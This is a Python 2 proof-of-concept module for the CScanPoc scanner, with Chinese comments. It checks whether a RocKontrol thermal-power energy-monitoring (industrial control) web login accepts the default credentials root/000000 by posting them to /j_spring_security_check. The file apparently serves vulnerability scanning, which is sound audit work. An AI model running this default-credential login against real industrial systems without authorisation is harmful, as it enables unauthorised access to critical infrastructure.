# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'RocKontrol_0001' # 平台漏洞编号，留空
    name = '工控安全之火力发电能耗监测弱口令' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.MISCONFIGURATION # 漏洞类型
    disclosure_date = '	2016-01-12'  # 漏洞公布时间
    desc = '''
        工控安全之火力发电能耗监测弱口令。
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0145739
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = 'RocKontrol'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'rockontrol_0000' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg +'/j_spring_security_check'
            data = 'j_username=root&j_password=000000&submit1=%E7%99%BB%E5%BD%95'
            code,head,res,errcode,urls =hh.http(url,post=data)
            if code==302 and 'Location:' in head and 'error=true' not in head:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()